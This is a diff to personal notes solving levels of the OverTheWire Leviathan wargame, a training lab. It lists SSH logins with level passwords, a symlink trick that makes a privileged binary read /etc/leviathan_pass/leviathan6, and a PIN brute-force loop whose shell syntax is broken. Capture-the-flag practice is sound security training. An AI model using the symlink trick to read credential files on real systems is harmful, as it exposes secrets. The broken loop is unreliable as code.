@@ -60,3 +60,17 @@ Tith4cokei
 lvl 5 --> lvl 6
 ssh leviathan5@leviathan.labs.overthewire.org -p 2223
 Tith4cokei
+ls
+./leviathan5 // answer : Cannot find /tmp/file.log
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log // ln -s creates a symbolic link between two files
+// like this on calling ./leviathan5, it ask for /tmp.file.log and give us /etc/leviathan_pass/leviathan6 
+ls /tmp/file.log // we get a blueish /tmp/file.log
+./leviathan5
+UgaoFee4li
+
+lvl 6 --> lvl 7
+ssh leviathan6@leviathan.labs.overthewire.org -p 2223
+UgaoFee4li
+
+
+ for i in {0000..9999}; do echo $i; do /leviathan6 $i; done
